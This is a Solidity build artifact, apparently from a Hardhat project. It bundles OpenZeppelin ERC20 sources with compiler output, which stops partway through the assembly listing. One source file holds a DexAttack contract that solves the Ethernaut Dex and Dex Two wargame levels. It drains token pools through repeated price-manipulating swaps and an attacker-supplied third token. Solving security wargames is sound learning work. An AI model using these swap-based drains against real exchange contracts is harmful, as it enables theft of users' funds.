{
	"id": "0fdbc72c1c128bdf3d76204660b40062",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.18",
	"solcLongVersion": "0.8.18+commit.87f61d96",
	"input": {
		"language": "Solidity",
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		},
		"sources": {
			"ethernaut/Dex.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface IDex {\n  function swap(address from, address to, uint amount) external;\n}\ncontract DexAttack {\n    address token1;\n    address token2;\n    address token3;\n    address dex;\n\n    constructor(address _token1, address _token2, address _dex)\n    {\n        token1 = _token1;\n        token2 = _token2;\n        dex = _dex;\n    }\n\n    function setToken3(address _token3) public{\n        token3 = _token3;\n    }\n\n    function dexAttack() external {\n        IERC20(token1).transferFrom(msg.sender, address(this), 10);\n        IERC20(token2).transferFrom(msg.sender, address(this), 10);\n\n        IERC20(token1).approve(dex, type(uint).max);\n        IERC20(token2).approve(dex, type(uint).max);\n\n        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));  \n        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));\n        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));\n        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));\n        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));\n        IDex(dex).swap(token2, token1, 45);\n    }\n\n      function dex2Attack() external {\n        IERC20(token1).transferFrom(msg.sender, address(this), 10);\n        IERC20(token2).transferFrom(msg.sender, address(this), 10);\n\n        IERC20(token1).approve(dex, type(uint).max);\n        IERC20(token2).approve(dex, type(uint).max);\n\n        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));  \n        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));\n        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));\n        IDex(dex).swap(token2, token1, IERC20(token2).balanceOf(address(this)));\n        IDex(dex).swap(token1, token2, IERC20(token1).balanceOf(address(this)));\n        IDex(dex).swap(token2, token1, 45);\n\n        //At this point issue 90 tokens to the dex and 90 tokens to this address from token C\n        //then call swap from C to B.\n        IERC20(token3).transferFrom(msg.sender, dex, 90);\n        IERC20(token3).transferFrom(msg.sender, address(this), 90);\n        IERC20(token3).approve(dex, type(uint).max);\n\n        IDex(dex).swap(token3, token2, IERC20(token3).balanceOf(address(this)));\n    }\n\n\n}"
			},
			"@openzeppelin/contracts/token/ERC20/IERC20.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n"
			},
			"@openzeppelin/contracts/token/ERC20/ERC20.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n            // decrementing then incrementing.\n            _balances[to] += amount;\n        }\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        unchecked {\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n            _balances[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n            // Overflow not possible: amount <= accountBalance <= totalSupply.\n            _totalSupply -= amount;\n        }\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\n}\n"
			},
			"@openzeppelin/contracts/utils/Context.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"
			},
			"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol": {
				"content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.0;\n\nimport \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"
			}
		}
	},
	"output": {
		"contracts": {
			"@openzeppelin/contracts/token/ERC20/ERC20.sol": {
				"ERC20": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "string",
									"name": "name_",
									"type": "string"
								},
								{
									"internalType": "string",
									"name": "symbol_",
									"type": "string"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "account",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "subtractedValue",
									"type": "uint256"
								}
							],
							"name": "decreaseAllowance",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "addedValue",
									"type": "uint256"
								}
							],
							"name": "increaseAllowance",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"details": "Implementation of the {IERC20} interface. This implementation is agnostic to the way tokens are created. This means that a supply mechanism has to be added in a derived contract using {_mint}. For a generic mechanism see {ERC20PresetMinterPauser}. TIP: For a detailed writeup see our guide https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How to implement supply mechanisms]. The default value of {decimals} is 18. To change this, you should override this function so it returns a different value. We have followed general OpenZeppelin Contracts guidelines: functions revert instead returning `false` on failure. This behavior is nonetheless conventional and does not conflict with the expectations of ERC20 applications. Additionally, an {Approval} event is emitted on calls to {transferFrom}. This allows applications to reconstruct the allowance for all accounts just by listening to said events. Other implementations of the EIP may not emit these events, as it isn't required by the specification. Finally, the non-standard {decreaseAllowance} and {increaseAllowance} functions have been added to mitigate the well-known issues around setting allowances. See {IERC20-approve}.",
						"events": {
							"Approval(address,address,uint256)": {
								"details": "Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance."
							},
							"Transfer(address,address,uint256)": {
								"details": "Emitted when `value` tokens are moved from one account (`from`) to another (`to`). Note that `value` may be zero."
							}
						},
						"kind": "dev",
						"methods": {
							"allowance(address,address)": {
								"details": "See {IERC20-allowance}."
							},
							"approve(address,uint256)": {
								"details": "See {IERC20-approve}. NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on `transferFrom`. This is semantically equivalent to an infinite approval. Requirements: - `spender` cannot be the zero address."
							},
							"balanceOf(address)": {
								"details": "See {IERC20-balanceOf}."
							},
							"constructor": {
								"details": "Sets the values for {name} and {symbol}. All two of these values are immutable: they can only be set once during construction."
							},
							"decimals()": {
								"details": "Returns the number of decimals used to get its user representation. For example, if `decimals` equals `2`, a balance of `505` tokens should be displayed to a user as `5.05` (`505 / 10 ** 2`). Tokens usually opt for a value of 18, imitating the relationship between Ether and Wei. This is the default value returned by this function, unless it's overridden. NOTE: This information is only used for _display_ purposes: it in no way affects any of the arithmetic of the contract, including {IERC20-balanceOf} and {IERC20-transfer}."
							},
							"decreaseAllowance(address,uint256)": {
								"details": "Atomically decreases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address. - `spender` must have allowance for the caller of at least `subtractedValue`."
							},
							"increaseAllowance(address,uint256)": {
								"details": "Atomically increases the allowance granted to `spender` by the caller. This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}. Emits an {Approval} event indicating the updated allowance. Requirements: - `spender` cannot be the zero address."
							},
							"name()": {
								"details": "Returns the name of the token."
							},
							"symbol()": {
								"details": "Returns the symbol of the token, usually a shorter version of the name."
							},
							"totalSupply()": {
								"details": "See {IERC20-totalSupply}."
							},
							"transfer(address,uint256)": {
								"details": "See {IERC20-transfer}. Requirements: - `to` cannot be the zero address. - the caller must have a balance of at least `amount`."
							},
							"transferFrom(address,address,uint256)": {
								"details": "See {IERC20-transferFrom}. Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20}. NOTE: Does not update the allowance if the current allowance is the maximum `uint256`. Requirements: - `from` and `to` cannot be the zero address. - `from` must have a balance of at least `amount`. - the caller must have allowance for ``from``'s tokens of at least `amount`."
							}
						},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1532:12844  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n  mstore(0x40, 0x80)\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1980:2093  constructor(string memory name_, string memory symbol_) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_2\n  swap2\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2046:2051  _name */\n  0x03\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2046:2059  _name = name_ */\n  tag_6\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2054:2059  name_ */\n  dup4\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2046:2051  _name */\n  dup3\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2046:2059  _name = name_ */\n  tag_7\n  jump\t// in\ntag_6:\n  pop\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2069:2076  _symbol */\n  0x04\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2069:2086  _symbol = symbol_ */\n  tag_8\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2079:2086  symbol_ */\n  dup3\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2069:2076  _symbol */\n  dup3\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":2069:2086  _symbol = symbol_ */\n  tag_7\n  jump\t// in\ntag_8:\n  pop\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1980:2093  constructor(string memory name_, string memory symbol_) {... */\n  pop\n  pop\n    /* \"@openzeppelin/contracts/token/ERC20/ERC20.sol\":1532:12844  contract ERC20 is Context, IERC20, IERC20Metadata {... */\n  jump(tag_16)\n    /* \"#utility.yul\":14:141   */\ntag_10:\n    /* \"#utility.yul\":75:85   */\n  0x4e487b71\n    /* \"#utility.yul\":70:73   */\n  0xe0\n    /* \"#utility.yul\":66:86   */\n  shl\n    /* \"#utility.yul\":63:64   */\n  0x00\n    /* \"#utility.yul\":56:87   */\n  mstore\n    /* \"#utility.yul\":106:110   */\n  0x41\n    /* \"#utility.yul\":103:104   */\n  0x04\n    /* \"#utility.yul\":96:111   */\n  mstore\n    /* \"#utility.yul\":130:134   */\n  0x24\n    /* \"#utility.yul\":127:128   */\n  0x00\n    /* \"#utility.yul\":120:135   */\n  revert\n    /* \"#utility.yul\":146:986   */\ntag_11:\n    /* \"#utility.yul\":200:205   */\n  0x00\n    /* \"#utility.yul\":253:256   */\n  dup3\n    /* \"#utility.yul\":246:250   */\n  0x1f\n    /* \"#utility.yul\":238:244   */\n  dup4\n    /* \"#utility.yul\":234:251   */\n  add\n    /* \"#utility.yul\":230:257   */\n  slt\n    /* \"#utility.yul\":220:275   */\n  tag_19\n  jumpi\n    /* \"#utility.yul\":271:272   */\n  0x00\n    /* \"#utility.yul\":268:269   */\n  dup1\n    /* \"#utility.yul\":261:273   */\n  revert\n    /* \"#utility.yul\":220:275   */\ntag_19:\n    /* \"#utility.yul\":294:307   */\n  dup2\n  mload\n  sub(shl(0x40, 0x01), 0x01)\n    /* \"#utility.yul\":356:366   */\n  dup1\n  dup3\n  gt\n    /* \"#utility.yul\":353:389   */\n  iszero\n  tag_21\n  jumpi\n    /* \"#utility.yul\":369:387   */\n  tag_21\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":444:446   */\n  0x40\n    /* \"#utility.yul\":438:447   */\n  mload\n    /* \"#utility.yul\":412:414   */\n  0x1f\n    /* \"#utility.yul\":498:511   */\n  dup4\n  add\n  not(0x1f)\n    /* \"#utility.yul\":494:516   */\n  swap1\n  dup2\n  and\n    /* \"#utility.yul\":518:520   */\n  0x3f\n    /* \"#utility.yul\":490:521   */\n  add\n    /* \"#utility.yul\":486:526   */\n  and\n    /* \"#utility.yul\":474:527   */\n  dup2\n  add\n  swap1\n    /* \"#utility.yul\":542:560   */\n  dup3\n  dup3\n  gt\n    /* \"#utility.yul\":562:584   */\n  dup2\n  dup4\n  lt\n    /* \"#utility.yul\":539:585   */\n  or\n    /* \"#utility.yul\":536:608   */\n  iszero\n  tag_23\n  jumpi\n    /* \"#utility.yul\":588:606   */\n  tag_23\n  tag_10\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":628:638   */\n  dup2\n    /* \"#utility.yul\":624:626   */\n  0x40\n    /* \"#utility.yul\":617:639   */\n  mstore\n    /* \"#utility.yul\":663:665   */\n  dup4\n    /* \"#utility.yul\":655:661   */\n  dup2\n    /* \"#utility.yul\":648:666   */\n  mstore\n    /* \"#utility.yul\":685:689   */\n  0x20\n    /* \"#utility.yul\":675:689   */\n  swap3\n  pop\n    /* \"#utility.yul\":730:733   */\n  dup7\n    /* \"#utility.yul\":725:727   */\n  dup4\n    /* \"#utility.yul\":720:722   */\n  dup6\n    /* \"#utility.yul\":712:718   */\n  dup9\n    /* \"#utility.yul\":708:723   */\n  add\n    /* \"#utility.yul\":704:728   */\n  add\n    /* \"#utility.yul\":701:734   */\n  gt\n    /* \"#utility.yul\":698:751   */\n  iszero\n  tag_24\n  jumpi\n    /* \"#utility.yul\":747:748   */\n  0x00\n    /* \"#utility.yul\":744:745   */\n  dup1\n    /* \"#utility.yul\":737:749   */\n  revert\n    /* \"#utility.yul\":698:751   */\ntag_24:\n    /* 